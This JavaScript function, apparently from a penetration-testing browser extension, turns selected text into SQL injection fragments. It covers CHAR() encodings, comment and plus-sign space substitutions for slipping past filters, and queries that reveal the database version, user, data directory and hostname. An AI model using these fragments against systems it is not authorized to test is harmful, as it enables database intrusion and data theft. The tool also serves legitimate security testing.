function setSqlBasics(id) {
	const operations = {
		// Codificaciones
		utf8: (str) => `CONVERT(${str} USING utf8)`,
		latin1: (str) => `CONVERT(${str} USING latin1)`,
		cast: (str) => `cast(${str})`,
		unhex: (str) => `unhex(hex(${str}))`,
		uncompress: (str) => `uncompress(compress(${str}))`,

		// CHAR()
		mysqlchar: (str) => {
			let codes = "";
			for (let i = 0; i < str.length; i++) {
				codes += str.charCodeAt(i) + (i < str.length - 1 ? ", " : "");
			}
			return `CHAR(${codes})`;
		},
		mssqlchar: (str) => {
			let parts = "";
			for (let i = 0; i < str.length; i++) {
				parts += `CHAR(${str.charCodeAt(i)})${i < str.length - 1 ? "+" : ""}`;
			}
			return parts;
		},
		oraclechar: (str) => {
			let parts = "";
			for (let i = 0; i < str.length; i++) {
				parts += `CHR(${str.charCodeAt(i)})${i < str.length - 1 ? " || " : ""}`;
			}
			return parts;
		},

		// Reemplazos de espacio
		spaceplus: (str) =>
			str
				.replace(/\/\*\*\//g, "+")
				.replace(/\/\*\&a\=\*\//g, "+")
				.replace(/ /g, "+"),
		spaceinline: (str) =>
			str
				.replace(/\/\*\*\//g, "/**/")
				.replace(/\/\*\&a\=\*\//g, "/**/")
				.replace(/ /g, "/**/"),
		spaceclear: (str) =>
			str
				.replace(/\+/g, " ")
				.replace(/\/\*\*\//g, " ")
				.replace(/ /g, " "),

		// Variables del sistema
		varversion: () => "VERSION()",
		varversion2: () => "@@VERSION()",
		varversion3: () => "@@GLOBAL.VERSION",
		varversion4: () => "@@VERSION_COMMENT",

		varuser1: () => "USER()",
		varuser2: () => "CURRENT_USER()",
		varuser3: () => "SYSTEM_USER()",
		varuser4: () => "SESSION_USER()",
		varuser5: () => "SUBSTRING_INDEX(USER(),0x40,1)",
		varuser6: () => "(SELECT+CONCAT(USER)+FROM+INFORMATION_SCHEMA.PROCESSLIST)",

		vardb1: () => "DATABASE()",
		vardb2: () => "SCHEMA()",
		vardb3: () => "(SELECT+CONCAT(DB)+FROM+INFORMATION_SCHEMA.PROCESSLIST)",

		varserver1: () => "@@CHARACTER_SETS_DIR",
		varserver2: () => "@@LOG_ERROR",
		varserver3: () => "@@LANGUAGE",
		varserver4: () => "@@PID_FILE",
		varserver5: () => "@@PLUGIN_DIR",
		varserver6: () => "@@SOCKET",
		varserver7: () => "@@BASEDIR",
		varserver8: () => "@@DATADIR",
		varserver9: () => "@@SLAVE_LOAD_TMPDIR",

		varcharset1: () => "@@CHARACTER_SET_CLIENT",
		varcharset2: () => "@@CHARACTER_SET_CONNECTION",
		varcharset3: () => "@@CHARACTER_SET_DATABASE",
		varcharset4: () => "@@CHARACTER_SET_FILESYSTEM",
		varcharset5: () => "@@CHARACTER_SET_SERVER",

		varsys1: () => "IF((@@LOWER_CASE_TABLE_NAMES)=0,0x594553,0x4e4f)",
		varsys2: () => "IF((@@LOWER_CASE_FILE_SYSTEM)=0,0x594553,0x4e4f)",
		varsys3: () => "@@COLLATION_CONNECTION",
		varsys4: () => "@@HOSTNAME",
		varsys5: () => "@@HAVE_INNODB",
		varsys6: () => "@@FT_BOOLEAN_SYNTAX",
		varsys7: () => "@@PORT",
		varsys8: () => "@@MYISAM_RECOVER_OPTIONS",
		varsys9: () => "@@VERSION_COMPILE_OS",
		varsys10: () => "@@VERSION_COMPILE_MACHINE",
		varsys11: () => "@@HAVE_OPENSSL",
		varsys12: () => "@@HAVE_SYMLINK",
		varsys13: () => "@@WAIT_TIMEOUT",

		// Otros
		othlpad: (str) => `LPAD(${str},2,0x30)`,
		othrepeat: (str) => `REPEAT(${str},5)`,
		othifstat: (str) => `IF((${str})>-1,0x00,0x00)`,
		othcaswth: (str) => `CASE+WHEN+(${str})+THEN+1+ELSE+2+END`,
	};

	const operation = operations[id];
	if (!operation) {
		console.warn(`Operación no soportada: "${id}"`);
		return;
	}

	if (typeof operation === "function") {
		getSelectedText((str) => setSelectedText(operation(str)));
	} else {
		setSelectedText(operation);
	}
}
